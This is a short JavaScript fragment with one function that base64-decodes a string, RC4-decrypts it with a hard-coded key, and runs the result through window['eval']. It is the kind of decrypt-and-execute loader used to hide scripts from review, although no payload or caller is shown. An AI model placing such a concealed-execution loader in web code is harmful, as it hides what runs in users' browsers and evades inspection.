function $_(str) {
    str = atob(str);
    var keySchedule = [];
    var keySchedule_j = 0;
    var t;
    var result = '';
    var keySchedule_i = 0;
    for (; keySchedule_i < 256; keySchedule_i++) {
        keySchedule[keySchedule_i] = keySchedule_i;
    }
    keySchedule_i = 0;
    for (; keySchedule_i < 256; keySchedule_i++) {
        keySchedule_j = (keySchedule_j + keySchedule[keySchedule_i] + String('0,E,N7Pxaz!EM22Dc)xoTtK6R5<3HZ')['charCodeAt'](keySchedule_i % 30)) % 256;
        t = keySchedule[keySchedule_i];
        keySchedule[keySchedule_i] = keySchedule[keySchedule_j];
        keySchedule[keySchedule_j] = t;
    }
    keySchedule_i = 0;
    keySchedule_j = 0;
    var Y = 0;
    for (; Y < str['length']; Y++) {
        keySchedule_i = (keySchedule_i + 1) % 256;
        keySchedule_j = (keySchedule_j + keySchedule[keySchedule_i]) % 256;
        t = keySchedule[keySchedule_i];
        keySchedule[keySchedule_i] = keySchedule[keySchedule_j];
        keySchedule[keySchedule_j] = t;
        result = result + String['fromCharCode'](str['charCodeAt'](Y) ^ keySchedule[(keySchedule[keySchedule_i] + keySchedule[keySchedule_j]) % 256]);
    }
    window["eval"](result);
};